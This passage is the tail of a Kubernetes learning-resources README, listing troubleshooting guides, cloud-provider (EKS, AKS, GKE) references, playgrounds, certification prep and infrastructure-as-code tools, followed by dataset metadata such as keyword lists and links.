- [How to identify and troubleshoot common Kubernetes errors](https://newrelic.com/blog/how-to-relic/monitoring-kubernetes-part-three)

- [Kubernetes Troubleshooting: 5 Common Errors & How to Fix Them](https://lumigo.io/kubernetes-troubleshooting/)

- [Kubernetes Troubleshooting – The Complete Guide](https://komodor.com/learn/kubernetes-troubleshooting-the-complete-guide/)


- [A visual guide on troubleshooting Kubernetes deployments](https://learnk8s.io/troubleshooting-deployments)

- [Kubernetes Troubleshooting: Effective Strategies for Unraveling the Puzzle](https://www.groundcover.com/kubernetes-troubleshooting)


- [node-problem-detector](https://github.com/kubernetes/node-problem-detector): This is a place for various problem detectors running on the Kubernetes nodes.


- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat): ""Vulnerable by Design"" cluster environment to learn and practice Kubernetes security using an interactive hands-on playground 🚀

##  Kubernetes in the cloud:

### AWS EKS

- [Terraform module to create AWS Elastic Kubernetes (EKS) resources](https://github.com/terraform-aws-modules/terraform-aws-eks)

- [This project](https://github.com/aws-ia/terraform-aws-eks-blueprints) contains a collection of Amazon EKS cluster patterns implemented in Terraform that demonstrate how fast and easy it is for customers to adopt Amazon EKS. The patterns can be used by AWS customers, partners, and internal AWS teams to configure and manage complete EKS clusters that are fully bootstrapped with the operational software that is needed to deploy and operate workloads.

- [EKS Workshop](https://www.eksworkshop.com/)

- [ (Amazon EKS) Best Practices](https://aws.github.io/aws-eks-best-practices/): A best practices guide for day 2 operations, including operational excellence, security, reliability, performance efficiency, and cost optimization.

- [AWS EKS Kubernetes - Masterclass | DevOps, Microservices](https://github.com/stacksimplify/aws-eks-kubernetes-masterclass)


### Azure AKS

- [Azure AKS Kubernetes Masterclass](https://github.com/stacksimplify/azure-aks-kubernetes-masterclass).

- [Official repository for the AKS Landing Zone Accelerator program](https://github.com/Azure/AKS-Landing-Zone-Accelerator): Azure Landing Zone Accelerators are architectural guidance, reference architecture, reference implementations and automation packaged to deploy workload platforms on Azure at Scale and aligned with industry proven practices.

- [Azure Kubernetes Service Checklist](https://www.the-aks-checklist.com/): This checklist contains a large set of best practices and some of them may not be relevant to your context and thus the rating may be incorrect in your case. Please choose and apply them wisely.


### Google GKE

- [Configures opinionated GKE clusters in terraform](https://github.com/terraform-google-modules/terraform-google-kubernetes-engine)

- [Sample applications for Google Kubernetes Engine (GKE)](https://github.com/GoogleCloudPlatform/kubernetes-engine-samples)


### Common

- [Elastic Cloud on Kubernetes](https://github.com/elastic/cloud-on-k8s): Elastic Cloud on Kubernetes automates the deployment, provisioning, management, and orchestration of Elasticsearch, Kibana, APM Server, Enterprise Search, Beats, Elastic Agent, Elastic Maps Server, and Logstash on Kubernetes based on the operator pattern.


## playgrounds 

- [Kubernetes Playground](https://github.com/netgroup/kubernetes-playground) - Let's play with Kubernetes in a safe sandbox.

- [Gluster file system with Kubernetes](https://github.com/bwolf/gluster-k8s-playground) - Playground to experiment with Gluster and Kubernetes.

- [A standalone Kubernetes cluster](https://github.com/nextbreakpoint/kubernetes-playground)  - Scripts for creating a standalone Kubernetes cluster for development.

- [Playground](https://labs.play-with-k8s.com/) -  Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds.

## CNCF certifications:

- [Kubernetes CKS Full Course](https://www.youtube.com/watch?v=d9xfB5qaOfg) Theory + Practice + Browser Scenarios by Kim Wuestkamp

- [Kubernetes CKS Course Environment](https://github.com/killer-sh/cks-course-environment)

- [Certified Kubernetes Security Specialist - CKS](https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist): Curated resources help you prepare for the CNCF/Linux Foundation CKS 2021 ""Kubernetes Certified Security Specialist"" Certification exam.

- [Kubernetes Certified Administration](https://github.com/walidshaari/Kubernetes-Certified-Administrator): Online resources that will help you prepare for taking the CNCF CKA 2020 ""Kubernetes Certified Administrator"" Certification exam.

- [CKA preparation](https://github.com/alijahnas/CKA-practice-exercises): This is a guide for passing the CNCF Certified Kubernetes Administrator (CKA) with practice exercises.

- [CKA Exercises](https://github.com/chadmcrowell/CKA-Exercises): Practice for the Certified Kubernetes Administrator (CKA) Exam.

## Kubernetes IAC:

Certainly! Here's a list of some popular tools for managing Kubernetes Infrastructure as Code (IAC):

1. **Helm:**
   - Overview: Helm is a package manager for Kubernetes that simplifies the deployment and management of applications.
   - GitHub: [Helm GitHub Repository](https://github.com/helm/helm)

2. **Kustomize:**
   - Overview: Kustomize is a tool for customizing Kubernetes manifests, allowing you to manage configuration variations in a declarative way.
   - GitHub: [Kustomize GitHub Repository](https://github.com/kubernetes-sigs/kustomize)

3. **Kubeconfig Management:**
   - Tools like `kubectx` and `kubens` help manage and switch between multiple Kubernetes contexts and namespaces.
   - GitHub: [kubectx GitHub Repository](https://github.com/ahmetb/kubectx)

4. **Kubeval:**
   - Overview: Kubeval is a tool for validating Kubernetes manifests against the Kubernetes API schema.
   - GitHub: [Kubeval GitHub Repository](https://github.com/instrumenta/kubeval)

5. **Kops:**
   - Overview: Kops helps you create, destroy, upgrade, and maintain Kubernetes clusters on AWS.
   - GitHub: [Kops GitHub Repository](https://github.com/kubernetes/kops)

6. **Terraform:**
   - Overview: While not specific to Kubernetes, Terraform is widely used for IAC and can be used to provision and manage Kubernetes infrastructure.
   - Website: [Terraform](https://www.terraform.io/)

7. **Pulumi:**
   - Overview: Pulumi allows you to define infrastructure as code using familiar programming languages, including TypeScript, Python, and Go.
   - GitHub: [Pulumi GitHub Repository](https://github.com/pulumi/pulumi)

8. **Helmfile:**
   - Overview: Declaratively deploy your Kubernetes manifests, Kustomize configs, and Charts as Helm releases. Generate all-in-one manifests for use with ArgoCD.
   - GitHub: [Kubeform GitHub Repository](https://github.com/helmfile/helmfile)

9. **Jsonnet:**
   - Overview: Jsonnet is a data templating language that can be used to generate Kubernetes manifests.
   - GitHub: [Jsonnet GitHub Repository](https://github.com/google/jsonnet)

10. **Skaffold:**
    - Overview: Skaffold is a command-line tool that facilitates continuous development for Kubernetes applications.
    - GitHub: [Skaffold GitHub Repository](https://github.com/GoogleContainerTools/skaffold)

This is not an exhaustive list, and the choice of tools depends on your specific use case and preferences. Always check the official documentation and community support for each tool for the most accurate and up-to-date information.

### Coming next

* Cluster Operation and maintanance

* Nodes AutoScaling and AutoSpotting (on AWS)

* Logging and Monitoring with Operators

* Cloud Native Storage for Statefulsets

* Backup & Recovery

* Service Mesh


## ❤ Show your support

Give a ⭐️ if this project helped you, Happy learning!
",0,0,76,apache-2.0,41.0,"['practical', 'kubernetes', 'exercices', 'repo', 'provides', 'resource', 'learn', 'kubernetes', 'practical', 'exercise', 'self', 'study', 'learn', 'easy', 'understand', 'master', 'kubernetes', 'complexity', 'problem', 'kubernetes', 'easy', 'understand', 'even', 'look', 'hard', 'first', 'look', 'icon', 'resource', 'map', 'course', 'help', 'understand', 'learn', 'start', 'prerequisite', 'would', 'nice', 'know', 'basic', 'understanding', 'running', 'conatiners', 'docker', 'containerd', 'preparation', 'get', 'prepared', 'please', 'install', 'least', 'kubectx', 'kns', 'krew', 'list', 'make', 'sure', 'bash', 'completion', 'kubectl', 'place', 'tool', 'use', 'mkcert', 'watch', 'mac', 'setup', 'activate', 'autocompletion', 'mac', 'setup', 'kubectl', 'plugin', 'git', 'kubectl', 'mac', 'setup', 'kubectx', 'kubens', 'golden', 'kubernetes', 'tooling', 'helper', 'list', 'use', 'kubernetes', 'cluster', 'local', 'machine', 'cloud', 'online', 'training', 'recommend', 'either', 'installed', 'use', 'kind', 'docker', 'desktop', 'use', 'slide', 'kubernauts', 'kubernetes', 'training', 'slide', 'refer', 'resource', 'kubernauts', 'kubernetes', 'learning', 'resources', 'list', 'kubernetes', 'guide', 'networking', 'purpose', 'website', 'provide', 'overview', 'various', 'kubernetes', 'networking', 'component', 'specific', 'focus', 'exactly', 'implement', 'required', 'functionality', 'guide', 'split', 'multiple', 'part', 'studied', 'mostly', 'independently', 'however', 'work', 'together', 'provide', 'complete', 'cluster', 'network', 'abstraction', 'possible', 'every', 'topic', 'guide', 'include', 'dedicated', 'lab', 'spun', 'locally', 'matter', 'minute', 'security', 'security', 'checklist', 'aim', 'providing', 'basic', 'list', 'guidance', 'link', 'comprehensive', 'documentation', 'topic', 'claim', 'exhaustive', 'meant', 'evolve', 'http', 'http', 'http', 'http', 'http', 'http', 'kubernetes', 'ctf', 'capture', 'flag', 'challenge', 'eks', 'http', 'slide', 'demo', 'secure', 'development', 'kubernetes', 'talk', 'curated', 'list', 'awesome', 'kubernetes', 'security', 'resource', 'curated', 'list', 'kubernetes', 'security', 'resource', 'article', 'book', 'tool', 'talk', 'video', 'kubernetes', 'security', 'checklist', 'requirements', 'kubernetes', 'security', 'checklist', 'requirements', 'one', 'authentication', 'authorization', 'logging', 'secret', 'configuration', 'network', 'workload', 'dockerfile', 'kubernetes', 'hardening', 'manual', 'kubernetes', 'hardening', 'guidance', 'storage', 'key', 'concept', 'kubernetes', 'storage', 'including', 'pvs', 'pvc', 'storageclass', 'misc', 'kelsey', 'hightower', 'guide', 'kubernetes', 'hard', 'way', 'go', 'bootstrap', 'kubernetes', 'cluster', 'without', 'use', 'installers', 'script', 'develop', 'knowledge', 'skill', 'get', 'kubernetes', 'online', 'course', 'class', 'introduction', 'kubernetes', 'lecture', 'note', 'note', 'kubernetes', 'resource', 'kubernetes', 'handbook', 'kubeapps', 'ui', 'deploying', 'managing', 'application', 'kubernetes', 'cluster', 'start', 'learning', 'kubernetes', 'today', 'step', 'step', 'guide', 'learning', 'kubernetes', 'kubernetes', 'harder', 'way', 'guide', 'setting', 'kubernetes', 'cluster', 'local', 'machine', 'kubernetes', 'mind', 'map', 'important', 'thing', 'need', 'run', 'kubernetes', 'production', 'awesome', 'kubernetes', 'resources', 'curated', 'list', 'awesome', 'kubernetes', 'tool', 'resource', 'useful', 'alias', 'kubectl', 'cheatsheet', 'goody', 'http', 'http', 'k', 'create', 'namespace', 'imperative', 'via', 'declarative', 'k', 'create', 'run', 'pod', 'deploymens', 'k', 'get', 'event', 'log', 'describe', 'object', 'merging', 'context', 'merge', 'kubeconfigs', 'cluster', 'context', 'sometimes', 'need', 'merge', 'multiple', 'kubeconfigs', 'single', 'file', 'go', 'miss', 'mastering', 'kubeconfig', 'file', 'ahmet', 'alp', 'balkan', 'http', 'kubernetes', 'secret', 'secret', 'secret', 'resource', 'containing', 'key', 'encoded', 'value', 'secret', 'encrypted', 'default', 'encoded', 'get', 'decoded', 'easily', 'everyone', 'access', 'namespace', 'whole', 'cluster', 'secret', 'value', 'exposed', 'pod', 'environment', 'variable', 'mounted', 'file', 'order', 'create', 'secret', 'text', 'file', 'run', 'following', 'creates', 'generic', 'secret', 'named', 'secretname', 'automatically', 'encodes', 'value', 'reading', 'since', 'secret', 'secret', 'way', 'keep', 'secret', 'secret', 'http', 'http', 'kubernetes', 'configmaps', 'configmap', 'object', 'consisting', 'pair', 'injected', 'application', 'configmap', 'separate', 'configuration', 'pod', 'way', 'prevent', 'hardcoding', 'configuration', 'data', 'configmaps', 'useful', 'storing', 'sharing', 'unencrypted', 'configuration', 'information', 'sensitive', 'information', 'stored', 'secret', 'instead', 'exercise', 'create', 'configmap', 'named', 'kubernauts', 'contains', 'key', 'named', 'dev', 'value', 'ops', 'argument', 'passed', 'k', 'create', 'configmap', 'command', 'create', 'configmap', 'containing', 'text', 'value', 'using', 'configmap', 'inject', 'data', 'application', 'whoami', 'whoareyou', 'whereami', 'problem', 'use', 'container', 'capable', 'telling', 'hosted', 'receives', 'call', 'like', 'build', 'container', 'image', 'docker', 'define', 'two', 'different', 'deployment', 'whoami', 'whoareyou', 'deployment', 'use', 'container', 'image', 'create', 'deployment', 'ask', 'kubernetes', 'deploy', 'replica', 'whoami', 'replica', 'whoareyou', 'define', 'two', 'service', 'one', 'pod', 'define', 'ingres', 'object', 'define', 'route', 'service', 'outside', 'world', 'use', 'nginx', 'ingres', 'controller', 'rancher', 'cluster', 'explanation', 'file', 'content', 'define', 'deployment', 'kind', 'deployment', 'name', 'object', 'name', 'want', 'two', 'replica', 'replica', 'deploy', 'pod', 'label', 'app', 'whoami', 'selector', 'matchlabels', 'app', 'whoami', 'define', 'pod', 'template', 'whoami', 'label', 'metadata', 'label', 'app', 'whoami', 'pod', 'host', 'container', 'using', 'image', 'image', 'dns', 'based', 'service', 'discovery', 'whereami', 'kubia', 'pod', 'use', 'slightly', 'extended', 'app', 'simple', 'web', 'server', 'kubernetes', 'action', 'book', 'marko', 'different', 'namespaces', 'demonstrate', 'dns', 'based', 'service', 'discovery', 'service', 'provides', 'virtual', 'ip', 'vip', 'address', 'mean', 'service', 'ip', 'bound', 'physical', 'network', 'interface', 'service', 'act', 'like', 'internal', 'loadbalancer', 'magic', 'routing', 'trafic', 'vip', 'implemented', 'iptable', 'rule', 'managed', 'service', 'called', 'fqdn', 'form', 'headless', 'service', 'stickiness', 'learned', 'service', 'exposed', 'default', 'type', 'clusterip', 'work', 'internal', 'layer', 'provide', 'vip', 'stable', 'dns', 'address', 'client', 'connect', 'service', 'forward', 'connection', 'one', 'pod', 'backing', 'service', 'via', 'round', 'robin', 'work', 'fine', 'desired', 'stateless', 'apps', 'need', 'connect', 'one', 'pod', 'randomly', 'gain', 'performance', 'trafic', 'routing', 'via', 'load', 'balancing', 'case', 'stickiness', 'needed', 'client', 'need', 'connect', 'particular', 'pod', 'session', 'data', 'stickiness', 'need', 'define', 'service', 'without', 'clusterip', 'default', 'head', 'service', 'vip', 'need', 'define', 'service', 'service', 'let', 'see', 'action', 'whereami', 'service', 'utils', 'pod', 'following', 'expose', 'kubia', 'deployment', 'headless', 'service', 'setting', 'clusterip', 'scale', 'deployment', 'dns', 'query', 'service', 'within', 'util', 'client', 'pod', 'see', 'client', 'pod', 'always', 'connects', 'first', 'ip', 'dns', 'response', 'curl', 'headless', 'service', 'mean', 'load', 'balancing', 'happens', 'call', 'second', 'curl', 'service', 'clusterip', 'load', 'balancing', 'distributes', 'traffic', 'pod', 'ingres', 'tl', 'often', 'need', 'use', 'ingres', 'object', 'provide', 'path', 'based', 'domain', 'based', 'routing', 'tl', 'termination', 'capability', 'defined', 'annotation', 'ingres', 'resource', 'creating', 'ingres', 'service', 'ingres', 'controller', 'create', 'single', 'defined', 'service', 'ingres', 'resource', 'every', 'node', 'cluster', 'follwoing', 'using', 'traefik', 'ingres', 'controller', 'ingres', 'object', 'provide', 'path', 'based', 'domain', 'based', 'routing', 'tl', 'termination', 'valid', 'mkcert', 'made', 'tl', 'certificate', 'lab', 'environment', 'pod', 'create', 'pod', 'two', 'container', 'image', 'alpine', 'command', 'echo', 'hello', 'sleep', 'connect', 'second', 'container', 'run', 'easiest', 'way', 'create', 'pod', 'single', 'container', 'save', 'definition', 'yaml', 'file', 'extend', 'additional', 'container', 'container', 'related', 'value', 'final', 'yaml', 'contain', 'following', 'two', 'container', 'make', 'sure', 'container', 'different', 'name', 'shared', 'volume', 'extend', 'shared', 'volume', 'type', 'emptydir', 'named', 'volumemount', 'container', 'mountpath', 'follow', 'security', 'kubernetes', 'security', 'huge', 'topic', 'security', 'hardening', 'nice', 'problem', 'everyone', 'implement', 'according', 'security', 'requirement', 'governance', 'model', 'organization', 'going', 'scratch', 'surface', 'security', 'highly', 'recommend', 'go', 'following', 'resource', 'michael', 'hausenblas', 'liz', 'rice', 'community', 'http', 'http', 'http', 'service', 'account', 'namespace', 'default', 'serviceaccount', 'named', 'serviceaccount', 'namespaced', 'resource', 'used', 'container', 'running', 'pod', 'communicate', 'api', 'server', 'kubernetes', 'cluster', 'serviceaccounts', 'limited', 'permission', 'often', 'used', 'apply', 'principle', 'least', 'priviledge', 'data', 'key', 'secret', 'several', 'token', 'encoding', 'jwt', 'used', 'authenticate', 'api', 'server', 'let', 'get', 'token', 'head', 'use', 'debugger', 'decode', 'token', 'paste', 'token', 'get', 'payload', 'look', 'similar', 'see', 'service', 'account', 'default', 'linked', 'namespace', 'exists', 'using', 'secret', 'token', 'available', 'filesystem', 'container', 'pod', 'attached', 'serviceaccount', 'using', 'custom', 'serviceaccount', 'service', 'account', 'useful', 'need', 'provide', 'rome', 'right', 'permission', 'set', 'rule', 'defined', 'role', 'cluster', 'role', 'using', 'rbac', 'implementation', 'rbac', 'role', 'based', 'access', 'control', 'rbac', 'activated', 'default', 'help', 'provide', 'access', 'resource', 'object', 'like', 'namespaces', 'pod', 'service', 'etc', 'subject', 'entity', 'like', 'user', 'group', 'service', 'account', 'need', 'access', 'resource', 'deny', 'access', 'resource', 'need', 'access', 'rbac', 'increase', 'security', 'project', 'shall', 'defined', 'governance', 'model', 'organization', 'theorie', 'know', 'admins', 'rbac', 'implemented', 'role', 'clusterrole', 'rolebinding', 'clusterrolebinding', 'role', 'role', 'defines', 'subject', 'set', 'resource', 'like', 'get', 'set', 'delete', 'role', 'contains', 'set', 'rule', 'define', 'set', 'permission', 'roles', 'used', 'assigning', 'permission', 'resource', 'namespace', 'level', 'clusterrole', 'similar', 'role', 'clusterrole', 'grant', 'permission', 'cluster', 'level', 'giving', 'resource', 'permission', 'across', 'namespaces', 'cluster', 'rolebinding', 'clusterrolebinding', 'rolebinding', 'clusterrolebinding', 'used', 'grant', 'permission', 'priviledges', 'subject', 'entity', 'namespace', 'project', 'rolebinding', 'level', 'cluster', 'level', 'clusterrolebinding', 'create', 'new', 'namespace', 'myapp', 'new', 'custom', 'serviceaccount', 'create', 'new', 'role', 'permission', 'get', 'list', 'pod', 'create', 'rolebinding', 'bind', 'serviceaccount', 'role', 'podreader', 'namespace', 'extend', 'alpine', 'pod', 'key', 'value', 'apply', 'change', 'run', 'shell', 'get', 'toke', 'belonging', 'serviceaccountand', 'use', 'list', 'pod', 'default', 'namespace', 'myapp', 'namespace', 'see', 'difference', 'reading', 'kubernetes', 'tip', 'using', 'serviceaccount', 'permission', 'manager', 'todo', 'app', 'mvc', 'please', 'read', 'readme', 'related', 'blog', 'post', 'subfolder', 'try', 'understand', 'get', 'todo', 'list', 'app', 'running', 'day', 'operation', 'day', 'operation', 'mainly', 'implementing', 'principle', 'like', 'selfhealing', 'autoscaling', 'apps', 'infrastructure', 'component', 'like', 'node', 'component', 'define', 'resource', 'limit', 'liveness', 'readiness', 'probe', 'apps', 'run', 'continious', 'security', 'auditing', 'apply', 'gitops', 'principle', 'style', 'etc', 'first', 'section', 'go', 'app', 'auto', 'scaling', 'horizontal', 'pod', 'autoscaler', 'pod', 'autoscaling', 'hpa', 'horizontal', 'pod', 'autoscaler', 'simplify', 'kubernetes', 'day', 'ops', 'palette', 'cluster', 'profile', 'lab', 'exercise', 'hackaton', 'lab', 'exercise', 'hackaton', 'repo', 'help', 'learn', 'kubernetes', 'gitops', 'gitops', 'operating', 'model', 'kubernetes', 'cloud', 'native', 'technology', 'provides', 'set', 'best', 'practice', 'unifies', 'deployment', 'management', 'monitoring', 'cluster', 'application', 'another', 'way', 'put', 'path', 'towards', 'developer', 'experience', 'managing', 'application', 'ci', 'cd', 'pipeline', 'git', 'workflow', 'http', 'http', 'provides', 'opinionated', 'point', 'view', 'gitops', 'used', 'manage', 'infrastructure', 'service', 'application', 'layer', 'based', 'system', 'gitops', 'production', 'deployment', 'guide', 'troubleshooting', 'common', 'kubernetes', 'error', 'impact', 'cloud', 'deployment', 'exit', 'code', 'container', 'kubernetes', 'complete', 'guide', 'identify', 'troubleshoot', 'common', 'kubernetes', 'error', 'kubernetes', 'troubleshooting', 'common', 'error', 'fix', 'kubernetes', 'troubleshooting', 'complete', 'guide', 'visual', 'guide', 'troubleshooting', 'kubernetes', 'deployment', 'kubernetes', 'troubleshooting', 'effective', 'strategy', 'unraveling', 'puzzle', 'place', 'various', 'problem', 'detector', 'running', 'kubernetes', 'node', 'kubernetes', 'goat', 'vulnerable', 'design', 'cluster', 'environment', 'learn', 'practice', 'kubernetes', 'security', 'using', 'interactive', 'playground', 'kubernetes', 'cloud', 'aws', 'eks', 'terraform', 'module', 'create', 'aws', 'elastic', 'kubernetes', 'eks', 'resource', 'project', 'contains', 'collection', 'amazon', 'eks', 'cluster', 'pattern', 'implemented', 'terraform', 'demonstrate', 'fast', 'easy', 'customer', 'adopt', 'amazon', 'eks', 'pattern', 'used', 'aws', 'customer', 'partner', 'internal', 'aws', 'team', 'configure', 'manage', 'complete', 'eks', 'cluster', 'fully', 'bootstrapped', 'operational', 'software', 'needed', 'deploy', 'operate', 'workload', 'eks', 'workshop', 'amazon', 'eks', 'best', 'practice', 'best', 'practice', 'guide', 'day', 'operation', 'including', 'operational', 'excellence', 'security', 'reliability', 'performance', 'efficiency', 'cost', 'optimization', 'aws', 'eks', 'kubernetes', 'masterclass', 'devops', 'microservices', 'azure', 'ak', 'azure', 'ak', 'kubernetes', 'masterclass', 'official', 'repository', 'ak', 'landing', 'zone', 'accelerator', 'program', 'azure', 'landing', 'zone', 'accelerator', 'architectural', 'guidance', 'reference', 'architecture', 'reference', 'implementation', 'automation', 'packaged', 'deploy', 'workload', 'platform', 'azure', 'scale', 'aligned', 'industry', 'proven', 'practice', 'azure', 'kubernetes', 'service', 'checklist', 'checklist', 'contains', 'large', 'set', 'best', 'practice', 'may', 'relevant', 'context', 'thus', 'rating', 'may', 'incorrect', 'case', 'please', 'choose', 'apply', 'wisely', 'google', 'gke', 'configures', 'opinionated', 'gke', 'cluster', 'terraform', 'sample', 'application', 'google', 'kubernetes', 'engine', 'gke', 'common', 'elastic', 'cloud', 'kubernetes', 'elastic', 'cloud', 'kubernetes', 'automates', 'deployment', 'provisioning', 'management', 'orchestration', 'elasticsearch', 'kibana', 'apm', 'server', 'enterprise', 'search', 'beat', 'elastic', 'agent', 'elastic', 'map', 'server', 'logstash', 'kubernetes', 'based', 'operator', 'pattern', 'playground', 'kubernetes', 'playground', 'let', 'play', 'kubernetes', 'safe', 'sandbox', 'gluster', 'file', 'system', 'kubernetes', 'playground', 'experiment', 'gluster', 'kubernetes', 'standalone', 'kubernetes', 'cluster', 'script', 'creating', 'standalone', 'kubernetes', 'cluster', 'development', 'playground', 'play', 'kubernetes', 'playground', 'allows', 'user', 'run', 'cluster', 'matter', 'second', 'cncf', 'certification', 'kubernetes', 'cks', 'full', 'course', 'theory', 'practice', 'browser', 'scenario', 'kim', 'wuestkamp', 'kubernetes', 'cks', 'course', 'environment', 'certified', 'kubernetes', 'security', 'specialist', 'cks', 'curated', 'resource', 'help', 'prepare', 'foundation', 'cks', 'kubernetes', 'certified', 'security', 'specialist', 'certification', 'exam', 'kubernetes', 'certified', 'administration', 'online', 'resource', 'help', 'prepare', 'taking', 'cncf', 'cka', 'kubernetes', 'certified', 'administrator', 'certification', 'exam', 'cka', 'preparation', 'guide', 'passing', 'cncf', 'certified', 'kubernetes', 'administrator', 'cka', 'practice', 'exercise', 'cka', 'exercise', 'practice', 'certified', 'kubernetes', 'administrator', 'cka', 'exam', 'kubernetes', 'iac', 'certainly', 'list', 'popular', 'tool', 'managing', 'kubernetes', 'infrastructure', 'code', 'iac', 'helm', 'overview', 'helm', 'package', 'manager', 'kubernetes', 'simplifies', 'deployment', 'management', 'application', 'github', 'helm', 'github', 'repository', 'kustomize', 'overview', 'kustomize', 'tool', 'customizing', 'kubernetes', 'manifest', 'allowing', 'manage', 'configuration', 'variation', 'declarative', 'way', 'github', 'kustomize', 'github', 'repository', 'kubeconfig', 'management', 'tool', 'like', 'help', 'manage', 'switch', 'multiple', 'kubernetes', 'context', 'namespaces', 'github', 'kubectx', 'github', 'repository', 'kubeval', 'overview', 'kubeval', 'tool', 'validating', 'kubernetes', 'manifest', 'kubernetes', 'api', 'schema', 'github', 'kubeval', 'github', 'repository', 'kops', 'overview', 'kops', 'help', 'create', 'destroy', 'upgrade', 'maintain', 'kubernetes', 'cluster', 'aws', 'github', 'kops', 'github', 'repository', 'terraform', 'overview', 'specific', 'kubernetes', 'terraform', 'widely', 'used', 'iac', 'used', 'provision', 'manage', 'kubernetes', 'infrastructure', 'website', 'terraform', 'pulumi', 'overview', 'pulumi', 'allows', 'define', 'infrastructure', 'code', 'using', 'familiar', 'programming', 'language', 'including', 'typescript', 'python', 'go', 'github', 'pulumi', 'github', 'repository', 'helmfile', 'overview', 'declaratively', 'deploy', 'kubernetes', 'manifest', 'kustomize', 'configs', 'chart', 'helm', 'release', 'generate', 'manifest', 'use', 'argocd', 'github', 'kubeform', 'github', 'repository', 'jsonnet', 'overview', 'jsonnet', 'data', 'templating', 'language', 'used', 'generate', 'kubernetes', 'manifest', 'github', 'jsonnet', 'github', 'repository', 'skaffold', 'overview', 'skaffold', 'tool', 'facilitates', 'continuous', 'development', 'kubernetes', 'application', 'github', 'skaffold', 'github', 'repository', 'exhaustive', 'list', 'choice', 'tool', 'depends', 'specific', 'use', 'case', 'preference', 'always', 'check', 'official', 'documentation', 'community', 'support', 'tool', 'accurate', 'information', 'coming', 'next', 'cluster', 'operation', 'maintanance', 'node', 'autoscaling', 'autospotting', 'aws', 'logging', 'monitoring', 'operator', 'cloud', 'native', 'storage', 'statefulsets', 'backup', 'recovery', 'service', 'mesh', 'show', 'support', 'give', 'project', 'helped', 'happy', 'learning']","['kubernetes', 'service', 'pod', 'cluster', 'resource']",5,2,0,"['practical', 'kubernetes', 'exercices', 'prerequisite', 'preparation', 'tool', 'use', 'kubernetes', 'guide', 'network', 'security', 'storage', 'misc', 'useful', 'alias', 'kubectl', 'cheatsheet', 'goody', 'list', 'event', 'sort', 'timestamp', 'list', 'service', 'sort', 'name', 'get', 'pod', 'yaml', 'without', 'cluster', 'specific', 'information', 'show', 'label', 'pod', 'or', 'object', 'all', 'resource', 'support', 'list', 'get', 'request', 'verb', 'k', 'create', 'namespace', 'imperative', 'via', 'declarative', 'k', 'create', 'run', 'pod', 'deploymens', 'old', 'school', 'go', 'get', 'deprecate', 'create', 'service', 'via', 'expose', 'pod', 'open', 'new', 'terminal', 'session', 'caution', 'adapt', 'number', 'replica', 'k', 'get', 'event', 'log', 'describe', 'object', 'caution', 'ingres', 'ingress', 'object', 'namespaced', 'merge', 'context', 'merge', 'kubeconfigs', 'cluster', 'context', 'test', 'kubernetes', 'secret', 'secret', 'further', 'reading', 'kubernetes', 'configmaps', 'whoami', 'whoareyou', 'whereami', 'problem', 'what', 'we', 'll', 'do', 'expose', 'deployment', 'service', 'type', 'clusterip', 'new', 'terminal', 'session', 'call', 'create', 'service', 'type', 'nodeport', 'adapt', 'nodeport', 'env', 'please', 'give', 'lb', 'ip', 'pool', 'happy', 'dns', 'base', 'service', 'discovery', 'whereami', 'kubia', 'pod', 'what', 'we', 'll', 'do', 'repeat', 'service', 'call', 'many', 'time', 'see', 'loadbalancing', 'work', 'get', 'pong', 'why', 'ssh', 'node', 'examine', 'iptable', 'rule', 'headless', 'service', 'stickiness', 'inside', 'utils', 'container', 'difference', 'here', 'hit', 'kubia', 'one', 'node', 'load', 'balance', 'via', 'head', 'please', 'provide', 'host', 'entry', 'mapping', 'file', 'like', 'this', 'ip', 'ip', 'traefik', 'loadbalancer', 'ingres', 'controller', 'ingress', 'controller', 'load', 'balancing', 'although', 'define', 'backend', 'servicename', 'ingres', 'tl', 'alternatively', 'ca', 'want', 'use', 'mkcert', 'create', 'selfsigned', 'cert', 'with', 'openssl', 'genrsa', 'openssl', 'req', 'k', 'create', 'secret', 'tls', 'please', 'provide', 'host', 'entry', 'mapping', 'file', 'like', 'this', 'ip', 'ip', 'traefik', 'loadbalancer', 'ingres', 'controller', 'change', 'service', 'type', 'loadbalancer', 'access', 'ghost', 'loadbalancer', 'ip', 'port', 'node', 'work', 'trafik', 'only', 'scale', 'deployment', 'replica', 'see', 'backend', 'ghost', 'backened', 'http', 'work', 'pod', 'repo', 'exec', 'ssh', 'container', 'cleanup', 'share', 'volume', 'security', 'service', 'account', 'use', 'custom', 'serviceaccount', 'rbac', 'role', 'base', 'access', 'control', 'role', 'clusterrole', 'rolebinding', 'clusterrolebinding', 'what', 'we', 'll', 'do', 'view', 'role', 'allow', 'application', 'access', 'many', 'resource', 'deployment', 'service', 'nice', 'role', 'podreader', 'view', 'now', 'need', 'attach', 'role', 'podreader', 'application', 'represent', 'service', 'account', 'myapp', 'yes', 'work', 'work', 'further', 'reading', 'permission', 'manager', 'app', 'mvc', 'day', 'operation', 'pod', 'autoscaling', 'hpa', 'horizontal', 'pod', 'autoscaler', 'create', 'hpa', 'base', 'cpu', 'usage', 'in', 'another', 'terminal', 'run', 'inside', 'container', 'run', 'loop', 'bash', 'command', 'stress', 'cpu', 'check', 'hpa', 'status', 'lab', 'exercise', 'hackaton', 'gitops', 'troubleshoot', 'kubernetes', 'cloud', 'aws', 'eks', 'azure', 'ak', 'google', 'gke', 'common', 'playground', 'cncf', 'certification', 'kubernetes', 'iac', 'come', 'next', 'show', 'support']",109,"['service', 'pod', 'create', 'kubernetes', 'ip']",26,1.0,4.0,"[org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.springdoc:springdoc-openapi-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,0.0,39447,41.62758620689655,5.016235917826375,"['mkcert -> https://github.com/FiloSottile/mkcert', 'oh-my-zsh -> https://github.com/ohmyzsh/ohmyzsh', 'Mac setup -> https://docs.brew.sh/Shell-Completion', 'kubectl plugin -> https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectl', 'git -> https://git-scm.com/', 'kubectl -> https://kubernetes.io/docs/tasks/tools/install-kubectl/', 'kubectx & kubens -> https://github.com/ahmetb/kubectx', 'The Golden Kubernetes Tooling and Helpers list -> http://bit.ly/kubernetes-tooling-list', 'Kubernauts Kubernetes Trainings Slides -> https://goo.gl/Hzk2sd', 'Kubernauts Kubernetes Learning Resources List -> https://goo.gl/Rywkpd', 'this website -> https://www.tkng.io/', 'hands-on labs -> https://www.tkng.io/lab/', 'A 